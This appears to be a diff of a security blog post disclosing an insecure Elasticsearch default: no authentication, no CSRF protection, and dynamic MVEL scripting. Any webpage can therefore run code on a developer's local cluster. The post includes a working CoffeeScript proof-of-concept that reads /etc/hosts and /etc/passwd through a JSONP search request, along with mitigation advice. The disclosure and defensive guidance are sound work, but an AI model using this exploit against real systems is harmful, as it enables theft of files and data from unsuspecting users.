@@ -1,6 +1,6 @@
 ---
 layout: post
-title: Insecure default in Elasticsearch allows remote code execution
+title: Insecure default in Elasticsearch enables remote code execution
 
 ---
 
@@ -10,11 +10,11 @@ Elasticsearch has a flaw in its default configuration which makes it possible fo
 There are a couple of problems which enable the proof of concept I'm going to present:
 
 * Elasticsearch has no access roles or authentication mechanism. This means that you have full control over a cluster the moment you connect to it.
-* The API for Elasticsearch is accessible over [HTTP](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-http.html) and provides no CSRF protection whatsoever.
-* It contains a [feature](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_disabling_dynamic_scripts) which makes it possible to evaluate expressions as part of a query. An example usage of this feature is to specify a custom scoring function. It uses the [MVEL](http://mvel.codehaus.org/) language by default.
-* Up to version 1.2 [dynamic scripting](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_disabling_dynamic_scripts) (which makes it possible to send scripts to the cluster on the fly) was enabled by default. As mentioned in the documentation, this feature gives someone the same priviliges as the user that runs Elasticsearch. MVEL has no sandboxing at all.
+* The API for Elasticsearch is accessible over <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-http.html" target="_blank">HTTP</a> and provides no CSRF protection whatsoever.
+* It contains a <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html" target="_blank">feature</a> which makes it possible to evaluate expressions as part of a query. An example usage of this feature is to specify a custom scoring function while searching through documents. It uses the [MVEL](http://mvel.codehaus.org/) language by default.
+* Up to version 1.2 <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_enabling_dynamic_scripting" target="_blank">dynamic scripting</a> (which makes it possible to send scripts to the cluster on the fly) was enabled by default. As mentioned in the documentation, this feature gives someone the same priviliges as the user that runs Elasticsearch. MVEL has no sandboxing at all.
 
-There are no issues up to this point as long as you properly follow the documentation and make sure your Elasticsearch cluster is not available from the outside world. There is one target that isn't mentioned in the documentation though: The Developer! When you're developing an application that uses Elasticsearch you probably have it running on your machine. The default port is `9200`, and because there is no CSRF protection any webpage can just connect to the cluster using `localhost:9200` as the host.
+There are no issues up to this point as long as you properly follow the documentation and make sure your Elasticsearch cluster is not available from the outside world. There is one target that isn't mentioned in the documentation though: The Developer! When you're developing an application that uses Elasticsearch, you probably have it running on your machine. The default port is `9200` and because there is no CSRF protection any webpage can just connect to the cluster using `localhost:9200` as the host.
 
 ## PoC
 The following script will read `/etc/hosts` and `/etc/passwd` from a user visiting a webpage and display the contents in the browser.
@@ -27,8 +27,9 @@ read_file = (filename) ->
   new Scanner(new File("#{filename}")).useDelimiter("\\\\Z").next();
   """
 
+# This PoC assumes that there is at least one document stored in Elasticsearch, there are ways around that though
 $ ->
-  exploit = {
+  payload = {
     "size": 1,
     "query": {
       "filtered": {
@@ -41,11 +42,10 @@ $ ->
     "script_fields": {}
   }
 
-
   for filename in ["/etc/hosts", "/etc/passwd"]
-    exploit["script_fields"][filename] = {"script": read_file(filename)}
+    payload["script_fields"][filename] = {"script": read_file(filename)}
 
-  $.getJSON "http://localhost:9200/_search?source=#{encodeURIComponent(JSON.stringify(exploit))}&callback=?", (data) ->
+  $.getJSON "http://localhost:9200/_search?source=#{encodeURIComponent(JSON.stringify(payload))}&callback=?", (data) ->
     console.log(data)
     for hit in data["hits"]["hits"]
       for filename, contents of hit["fields"]
@@ -75,9 +75,9 @@ If you want to be as secure as possible, you should run Elasticsearch inside a v
 
 ## Additional targets
 
-Disabling scripting will prevent code execution, but that still leaves us with the issue of being able to query and administer the instance without limit. A webpage can easily dump the whole database running on your machine, sensitive data included.
+Disabling scripting will prevent code execution, but that still leaves us with the issue of being able to query and administer the instance without limit. A webpage can easily dump the whole database running on your machine, sensitive data included. This is impossible to fix by the Elasticsearch developers without adding authentication or CSRF protection.
 
-If an attacker can figure out the internal address of your production Elasticsearch instance (hint: assume they can), you're also open to leaking your production data. If your development machine is connected to a VPN which provides access to the Elasticsearch cluster, an attacker can easily query or [shut down](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/cluster-nodes-shutdown.html) your cluster simply by making you visit a webpage.
+If an attacker can figure out the internal address of your production Elasticsearch instance, you're also open to leaking your production data. If your development machine is connected to a VPN which provides access to the Elasticsearch cluster, an attacker can easily query or [shut down](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/cluster-nodes-shutdown.html) your cluster simply by making you visit a webpage.
 
 ### Notes
 
